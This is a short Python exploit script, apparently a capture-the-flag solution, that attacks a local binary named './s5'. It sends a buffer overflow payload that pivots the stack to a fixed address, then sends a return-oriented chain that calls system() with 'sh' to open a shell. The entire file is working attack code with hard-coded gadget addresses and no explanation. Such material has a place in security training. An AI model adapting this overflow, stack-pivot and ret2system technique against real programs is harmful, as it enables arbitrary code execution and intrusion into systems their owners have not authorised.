#!/usr/bin/env python
# -*- coding: utf-8 -*-

import binexpect
import struct

if __name__ == "__main__":
    setup = binexpect.setup('./s5')
    target = setup.target()
    target.setecho(False)

    base = 0x601500 # new stack base

    payload = b'A' * 32
    payload += struct.pack('L', base)           # new stack base
    payload += struct.pack('L', 0x400670)       # read(0, rbp-0x20, 0x400); [...];leave; ret
                                                # pivot here from main
    target.tryexpect('What is your password?')
    target.sendbinline(payload)

    payload = b'A' * 32
    payload += b'BBBBBBBB'                      # rbp

    payload += struct.pack('L', 0x400743)       # pop rdi; ret
    payload += struct.pack('L', base+0x20)      # @'sh'
    payload += struct.pack('L', 0x4006c7)       # system()

    payload += b'sh'.ljust(8, b'\x00')          # 'sh'
    target.sendbinline(payload)

    target.tryexpect("If you're cool you'll get a shell.")
    target.pwned()
